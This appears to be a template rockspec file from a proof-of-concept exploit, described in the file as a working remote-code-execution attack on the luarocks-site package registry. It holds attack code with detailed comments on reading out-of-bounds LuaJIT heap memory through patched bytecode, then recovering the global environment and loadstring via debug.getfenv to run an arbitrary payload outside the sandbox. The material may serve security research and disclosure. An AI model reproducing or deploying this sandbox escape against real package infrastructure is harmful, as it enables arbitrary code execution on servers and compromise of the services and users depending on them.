-- Necessary metadata for the package to be accepted by luarocks-site.
-- NOTE: The length of the package name affects how far into memory we are offset, and
-- therefore how far into memory we can read.
package = "%s"
version = "1.0-1"
description = {
    summary = "A working RCE proof-of-concept for luarocks-site.",
    detailed = "",
}

-- A number containing 8 bytes of out-of-bounds memory
local current_oob_read
-- A list of out-of-bounds table objects
local hits = {}

-- The Lua payload that will run outside of the sandbox
local payload = [==[%s]==]

-- Out of bounds reads happen here.
-- They are of the following form:
--     current_oob_read = 0.5
--     if current_oob_read == false then
--         hits[#hits + 1] = current_oob_read
--     end
--
-- This is copy+pasted multiple times for some number of indices. The reason we
-- have the `0.5` float is because then luajit generates a `KNUM` instruction
-- instead of a `KSHORT`. `KNUM` specifically has no bounds checking and is the
-- instruction we want to patch to read up to half a megabyte forward in
-- memory. Patching is done in `exploit.lua`.
%s

-- After the above code completes, `hits` becomes populated with a list of tables
-- present in the out-of-bounds section of luajit's heap.
-- `KNUM` is an instruction that loads a *numerical* value, so how does it load tables?
-- Under the hood, `KNUM` simply copies 8 bytes of data into a register. It does no type checking.
-- If these 8 bytes of data happen to be a reference to a table object, then it loads a table :D

-- Loop over all of the hits (we have no access to `ipairs` or `pairs` in the sandbox)
for i = 1, #hits do
    -- Why are we looking for tables in out-of-bounds memory? We're
    -- specifically looking for the `package.loaded` table, as it contains
    -- references to all important functions. The rest of the code performs the
    -- right checks to verify if the table we have loaded is an environment
    -- table. However, remember, `hits` is only a list of numbers, so we have
    -- to probe the table to see if it has anything useful.

    -- To execute regular shell code, we could simply run the equivalent of `hit.os.execute("evil bash here")`,
    -- however we want *full* Lua execution outside of the sandbox. However, `package.loaded` does not contain
    -- `loadstring` - the critical function for executing random Lua code.

    -- Therefore, we use a trick: `debug.getfenv(f)`. It normally returns a table of values that the
    -- function `f` can "see", which is fairly useless. However, if `f` is a *cfunction*, then it returns
    -- the entire global environment: `_G`. Bingo!

    local hit = hits[i]

    local maybe_debug_table = hit["debug"]

    -- This comparison produces an ISNEP instruction, which allows us to
    -- perform type checking without having access to the `type()` function.
    -- However, we don't want to compare to a boolean, so we patch the ISNEP
    -- operands to compare to a table object and a function object. Every time
    -- we compare to false, the patching script will make this comparison check
    -- if the value is a table. Every time we compare to true, we're checking
    -- if the value is a function object.
    --
    -- We need to exploit ISNEP, otherwise accessing a table key from a
    -- non-table object errors the program. We need silent failure to be able
    -- to scan a large segment of memory.
    if maybe_debug_table == false then
        local maybe_getfenv = maybe_debug_table["getfenv"]

        if maybe_getfenv == true then
            -- Since `debug.getfenv` is a cfunction, we can pass it into itself (as explained earlier)
            -- to retrieve the global environment.
            local global_env = maybe_getfenv(maybe_getfenv)

            if global_env == false then
                local loadstring = global_env["loadstring"]

                if loadstring == true then
                    local exploit_func = loadstring(payload)

                    -- We really want to ensure we never crash, so triple check
                    -- `exploit_func` is valid.
                    if exploit_func then
                        exploit_func()
                    end

                    -- We've successfully executed the payload. Our script uses the
                    -- package description to figure out if it should stop sending retry
                    -- attempts.
                    description.detailed = "x"
                end
            end
        end
    end
end
